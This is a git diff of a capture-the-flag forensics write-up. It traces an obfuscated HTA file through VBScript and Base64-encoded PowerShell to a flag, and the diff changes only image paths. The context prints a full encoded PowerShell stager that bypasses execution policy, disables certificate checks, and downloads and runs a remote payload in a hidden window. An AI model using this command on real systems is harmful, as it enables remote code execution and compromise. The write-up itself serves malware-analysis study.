@@ -17,15 +17,15 @@ A routine patrol through the Frontier Cluster's shadowy corners uncovered a sini
 
 We are given a heavily obfuscated HTA file to solve and an IP that is useless for now. I used CyberChef to clean this up a bit to see the contents of the file.
 
-![](/wanter_alive_1.png)
+![](/images/wanter_alive/wanter_alive_1.png)
 
 From that, we can see that there is a VBScript hidden inside. But if we scroll a bit more, we can see a Powershell script encoded using Base64.
 
-![](/wanter_alive_2.png)
+![](/images/wanter_alive/wanter_alive_2.png)
 
 After decoding the Base64 string, I found a URL that is storing another VBScript file. Since the domain doesn't exist, this must be the hostname for the IP that we are given.
 
-![](/wanter_alive_3.png)
+![](/images/wanter_alive/wanter_alive_3.png)
 
 After changing my `/etc/hosts`to use that hostname and the provided IP, I can now download the `wanted.tIF`file. It's a long file but there is one interesting part of the code where it spawns a shell.
 
@@ -113,7 +113,7 @@ End If
 
 Since I am a bit too lazy to reverse this, let's just run it with the running part removed. The value of the `sandareso` variable is yet another powershell command encoded using Base64.
 
-![](/wanter_alive_4.png)
+![](/images/wanter_alive/wanter_alive_4.png)
 
 ```
 powrsell -command     $Codigo U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19ycCcpKSkp$OWjuxd = [system.Text.encoding]::UTF8.GetString([system.Convert]::Frombase64String($codigo));powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD
@@ -121,8 +121,8 @@ powrsell -command     $Codigo U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2
 
 After decoding, we are given another URL to access.&#x20;
 
-![](/wanter_alive_5.png)
+![](/images/wanter_alive/wanter_alive_5.png)
 
 The link will give us the flag!
 
-![](/wanter_alive_6.png)
+![](/images/wanter_alive/wanter_alive_6.png)
